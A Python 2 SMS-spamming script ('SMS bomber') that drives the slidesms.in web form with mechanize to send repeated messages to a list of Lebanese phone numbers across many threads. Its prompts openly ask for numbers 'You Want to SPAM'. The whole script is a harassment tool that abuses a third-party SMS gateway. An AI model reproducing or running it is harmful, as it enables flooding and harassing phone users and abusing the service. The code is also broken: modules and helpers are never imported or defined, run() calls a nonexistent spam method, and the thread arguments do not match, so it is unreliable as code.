"""Made By Toki and revisited by venam => Now VENAMTEAM"""
from mechanize import Browser
import threading


############FUNCTION THAT CUT A FILES IN MANY PARTS######################
def chunkIt(seq, num):
  avg = len(seq) / float(num)
  out = []
  last = 0.0
  while last < len(seq):
    out.append(seq[int(last):int(last + avg)])
    last += avg
  return out
###########END OF FUNCTION THAT CUT A FILE IN MANY PARTS##################



####################Begining of class FREEZE   ###########################
class freeze(threading.Thread):

    def __init__(self, id, msn):
        self.id = id
        self.msn = msn
        self.running = False
        threading.Thread.__init__(self)

    #generate random password
    def randompass(self):
        password=""
        for i in xrange(11):
            password+=random.choice('1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW')
        return password

    def sms( self, msg, num, nbtime, sptime, len_acs):
        global n
        for a in xrange (nbtime):
            n+=1
            cond1= False
            while not cond1:
                try:
                        br = mechanize.Browser()
                        br = mechanize.Browser()
                        br.set_handle_robots(False)
                        br.set_handle_redirect(True)
                        br.open('http://slidesms.in')
                        br.select_form(nr=0)
                        form1 = re.findall(re.compile('<td style="padding-left:5px; padding-top:8px;"><input name="(.*)" id='), br.response().read())[0]
                        br.form['country'] = ['Lebanon']
                        br.form[form1] = '00961'+num
                        br.form['mymessage'] = msg
                        br.submit()
                        printed= "["+bcolors.OKGREEN + "+" + bcolors.ENDC +"]A New Message was Sent !"
                        print printed +" "*(80-len(printed)) + timing(n,len_acs)
                        time.sleep(sptime)
                        cond1 = True
                except:
                    printed= "["+bcolors.FAIL + "-" + bcolors.ENDC + "]Error"
                    print printed +" "*(80-len(printed)) + timing(n,len_acs)
    def run(self):
        for email in self.msn:
            while email.endswith("\n"):
                email = email[:-1]
            while email.endswith("\r"):
                email = email[:-1]
            email = email.lower()
            self.spam(email)
####################END of class FREEZE   ###########################



##################       MENU         ##################################
numlist = raw_input("[*]Enter the Number list You Want to SPAM :\n=> ")
msglist = raw_input("[*]Enter the Message list You Want to SPAM :\n=> ")
nbtime = input ("[*]Enter the Number Of Time to Send the Message :\n=> ")
sptime = input ("[*]Enter the Time between Each Message (in s) :\n=> ")
country = input ("[*]Enter the country code :\n=> ")
nbthread= input("Enter the number of threads working at the same time:\n=> ")
numb = chunkIt(numlist, nbthread)
msg = chunkIt(msglist, nbthread)

for i, i2 in enumerate(numb):
    for msgg in msg:
        Mythread = threading.Thread( target = freeze, args = (i,i2,msgg,nbtime,sptime,country) ).start()

################## END OF   MENU         ##################################
